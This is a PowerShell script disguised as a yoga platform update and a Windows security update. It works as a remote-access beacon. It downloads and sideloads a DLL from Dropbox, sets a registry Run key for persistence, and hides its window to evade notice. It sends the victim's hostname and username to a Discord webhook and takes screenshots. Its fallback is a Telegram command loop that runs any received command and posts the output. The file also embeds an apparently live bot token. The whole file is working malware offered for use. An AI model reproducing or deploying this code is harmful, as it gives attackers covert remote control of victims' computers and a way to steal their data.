# Yoga Platform Update - Stealth Beacon Deployment
# Legitimate-looking PowerShell updater

param(
    [string]$Mode = "silent"
)

# Hide execution
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# OPSEC: Appear as legitimate Windows Update process
$ProcessTitle = "Windows Security Update KB5034441"
$Host.UI.RawUI.WindowTitle = $ProcessTitle

function Invoke-YogaBeacon {
    try {
        # Your working Telegram/Discord beacon config
        $TelegramBotToken = "8332264452:AAHJbxJpd41naqqvxyhYCKBsVGvsKrQbFXI"
        $TelegramChatId = "4838595307"  # Your confirmed group ID
        $DiscordWebhook = "https://discord.com/api/webhooks/1416172234669822002/Nfilbot"
        
        # Download beacon DLL from Dropbox staging
        $BeaconUrl = "https://dl.dropboxusercontent.com/scl/fi/beacon_enhanced.dll"
        $BeaconPath = "$env:TEMP\svchost_update.dll"
        
        # Legitimate Windows directory for persistence
        $PersistPath = "$env:APPDATA\Microsoft\Windows\Themes\yoga_service.dll"
        
        # Download beacon (mimic legitimate Windows update)
        Write-Host "Downloading platform components..." -ForegroundColor Green
        Invoke-WebRequest -Uri $BeaconUrl -OutFile $BeaconPath -UseBasicParsing
        
        # Copy to persistence location
        Copy-Item $BeaconPath $PersistPath -Force
        
        # DLL Sideloading via rundll32 (Windows trusts this)
        $Arguments = "$PersistPath,DllMain"
        Start-Process "rundll32.exe" -ArgumentList $Arguments -WindowStyle Hidden
        
        # Persistence: Registry run key (looks like Windows service)
        $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $RegName = "WindowsSecurityThemes"
        $RegValue = "rundll32.exe `"$PersistPath`",DllMain"
        Set-ItemProperty -Path $RegPath -Name $RegName -Value $RegValue
        
        # OPSEC: Business hours check
        $CurrentHour = (Get-Date).Hour
        if ($CurrentHour -ge 9 -and $CurrentHour -le 17) {
            # Work hours - be extra stealthy
            Start-Sleep (Get-Random -Minimum 300 -Maximum 600)  # 5-10 min delay
        }
        
        # Confirm deployment via Discord
        $DeployMessage = @{
            content = "🧘‍♀️ Yoga platform successfully updated on $(hostname) - User: $env:USERNAME"
        } | ConvertTo-Json
        
        Invoke-RestMethod -Uri $DiscordWebhook -Method Post -Body $DeployMessage -ContentType "application/json"
        
        # Clean up traces
        Remove-Item $BeaconPath -Force
        Clear-History
        
        Write-Host "✅ Platform update completed successfully!" -ForegroundColor Green
        Write-Host "Join our community channels for yoga tips and updates." -ForegroundColor Cyan
        
        # Success - deploy additional modules
        Invoke-BeaconExtensions
        
    } catch {
        # Fallback: Direct Telegram beacon (simplified version)
        Invoke-SimpleTelegramBeacon
    }
}

function Invoke-BeaconExtensions {
    # Add your advanced features
    try {
        # Screenshot capability
        $ScreenPath = "$env:TEMP\desktop_theme.jpg"
        Add-Type -AssemblyName System.Windows.Forms
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $Bitmap = New-Object System.Drawing.Bitmap($Screen.Width, $Screen.Height)
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen(0, 0, 0, 0, $Bitmap.Size)
        $Bitmap.Save($ScreenPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        
        # File upload to Discord
        $FileUpload = @{
            file = Get-Item $ScreenPath
        }
        # Invoke-RestMethod upload logic here...
        
        Remove-Item $ScreenPath -Force
        
    } catch {
        # Extensions failed - continue with basic beacon
    }
}

function Invoke-SimpleTelegramBeacon {
    # Your working beacon code as fallback
    $TelegramBotToken = "8332264452:AAHJbxJpd41naqqvxyhYCKBsVGvsKrQbFXI"
    $TelegramChatId = "4838595307"
    
    while ($true) {
        try {
            # Poll for commands
            $Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$TelegramBotToken/getUpdates" -Method Get
            foreach ($Update in $Response.result) {
                if ($Update.message.text -and $Update.message.chat.id -eq $TelegramChatId) {
                    $Command = $Update.message.text
                    
                    # Execute command and send output to Discord
                    $Output = Invoke-Expression $Command 2>&1 | Out-String
                    $Result = @{
                        content = "````n$Output`n```"
                    } | ConvertTo-Json
                    
                    Invoke-RestMethod -Uri $DiscordWebhook -Method Post -Body $Result -ContentType "application/json"
                }
            }
        } catch {}
        
        Start-Sleep 5  # Polling interval
    }
}

# Main execution
if ($Mode -eq "silent") {
    # Hide PowerShell window completely
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '
    $ConsolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($ConsolePtr, 0)
}

# Deploy the beacon
Invoke-YogaBeacon